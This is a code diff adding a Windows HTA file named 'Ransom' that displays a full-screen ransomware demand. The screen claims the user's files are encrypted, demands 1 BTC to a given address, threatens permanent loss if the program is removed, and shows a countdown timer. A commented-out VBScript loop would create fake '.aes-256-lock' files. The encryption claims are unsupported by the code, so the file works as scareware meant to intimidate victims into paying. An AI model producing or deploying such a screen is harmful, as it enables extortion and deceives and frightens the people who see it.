@@ -1,0 +1,163 @@
+<!Doctype hta>
+<html>
+<head>
+	<title>Ransom</title>
+	<HTA:APPLICATION ID="oHTA"
+    APPLICATIONNAME="Ransom"
+	BORDER="thin"
+	BORDERSTYLE="normal"
+	CAPTION="no"
+	SCROLL="no"
+	ICON="graphics/face01.ico"
+	MAXIMIZEBUTTON="no"
+	MINIMIZEBUTTON="no"
+	SHOWINTASKBAR="no"
+	SINGLEINSTANCE="no" 
+	SYSMENU="yes"
+	VERSION="1.0"
+	 WINDOWSTATE="maximize"
+	>
+	 <SCRIPT>
+
+  /* This function also gets the value of commandLine,
+     which cannot be set as an attribute  */
+
+  function fnShowProp()
+  {
+    sTempStr = "applicationName  = " + oHTA.applicationName + "\n" + 
+               "border           = " + oHTA.border          + "\n" +
+               "borderStyle      = " + oHTA.borderStyle     + "\n" + 
+               "caption          = " + oHTA.caption         + "\n" +
+               "commandLine      = " + oHTA.commandLine     + "\n" +
+               "icon             = " + oHTA.icon            + "\n" +
+               "maximizeButton   = " + oHTA.maximizeButton  + "\n" +
+               "minimizeButton   = " + oHTA.minimizeButton  + "\n" + 
+               "showInTaskBar    = " + oHTA.showInTaskBar   + "\n" +
+               "singleInstance   = " + oHTA.singleInstance  + "\n" +  
+
+               "sysMenu          = " + oHTA.sysMenu         + "\n" + 
+               "version          = " + oHTA.version         + "\n" + 
+               "windowState      = " + oHTA.windowState     + "\n" ;
+
+oPre.innerText = sTempStr;		  
+  }
+  </SCRIPT>
+	<script language="vbscript">
+	''Do While i < 100
+	''	Dim max,min,rand
+	''	max=100000000000000000000000000000000000000000000000000
+	''	min=10000000000
+	''	Randomize
+	''	rand = Int((max-min+1)*Rnd+min)
+	''	Dim objFSO, objFile, strFileName
+	''	
+	''	strFileName = CStr(rand) + ".aes-256-lock"
+	''	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	''	
+	''	Set objFile = objFSO.OpenTextFile(strFileName, 2, true)
+	''	Set objShell = CreateObject("WScript.Shell")
+	''Loop
+	</script>
+	
+	<style>
+		html {
+			background-color: black;
+		}
+		
+		h1 {
+			padding-top: 25px;
+			text-align: center;
+			vertical-align: middle;
+			color: red;
+		}
+		
+		p.p1 {
+			color: red;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 25px;
+			padding-bottom: 0px;
+		}
+		
+		p.p2 {
+			color: red;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 0px;
+			padding-bottom: 0px;
+		}
+		p.p3 {
+			color: orange;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 0px;
+			padding-bottom: 0px;
+		}
+		
+		p.p4 {
+			color: red;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 0px;
+			padding-bottom: 0px;
+		}
+		p.p5 {
+			font-size: 25px;
+			text-align: center;
+			color: yellow;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 0px;
+			padding-bottom: 0px;
+		}
+		
+		span.btc_amount {
+			color: grey;
+		}
+		
+		span.btc_address {
+			color: white;
+			font-size: 15px;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 0px;
+			padding-bottom: 0px;
+		}
+		
+		p.p6 {
+			font-size: 25px;
+			text-align: center;
+			color: orange;
+			padding-left: 25px;
+			padding-right: 25px;
+			padding-top: 0px;
+			padding-bottom: 0px;
+		}
+		
+		span.countdown {
+			color: white;
+		}
+		
+		#countdown {
+			color: white;
+		}
+		
+		div.countdown {
+			color: white;
+		}
+	</style>
+<body>
+	<h1>&#9888; WARNING &#9888;</h1>
+		<p class="p1">Your documents, photos, databases and other important files have been encrypted with 20x times with RSA-256 encryption keys and unique key, generated for this computer.<P>
+		<p class="p2">Private decryption key is stored on a secret Internet server and nobody can decrypt your files until you pay and obtain the private key.</p>
+		<br/>
+		<p class="p3">You have a certain amount of time to submit the payment. If you do not send money within provided time, all your files will be permantly encrypted.</p>
+		<br/>
+		<p class="p4">WARNING: DO NOT TRY TO GET RID OF THE PROGRAM YOURSELF. ANY ACTION TAKEN WILL RESULT IN DECRYPTION KEY BEING DESTROYED IMIDEATLY. YOU WILL LOSE YOUR FILES FOREVER. ONLY WAY TO KEEP YOUR FILES IS TO FOLLOW THE INSTRUCTIONS.</p>
+		<br/>
+		<p class="p5">To decrypt your files you must send <span class="btc_amount">1</span> BTC to: <br/><span class="btc_address">etnjwidQMcTDM5DQzRvEGreqVSvYXRLM6hknu7Gm11tASrain2VzuU68ffYZ4vwNhGeigg8svXBhefL9PZD9aCar1MHSX2DfQ4</span></p>
+		<p class="p6">Time until your files are lost forever: <br/><span class="countdown"><center><iframe src="http://free.timeanddate.com/countdown/i6idtsoh/n2465/cf12/cm0/cu4/ct0/cs0/ca0/cr0/ss0/cacfff/cpcfff/pct/tcfff/fs100/szw320/szh135/tac000/tpc000/mac000/mpc000/iso2018-11-25T00:00:00" allowTransparency="true" frameborder="0" width="120" height="50"></iframe></center><div id="countdown"></div></span></p>
+
+
+</body>
+</html>
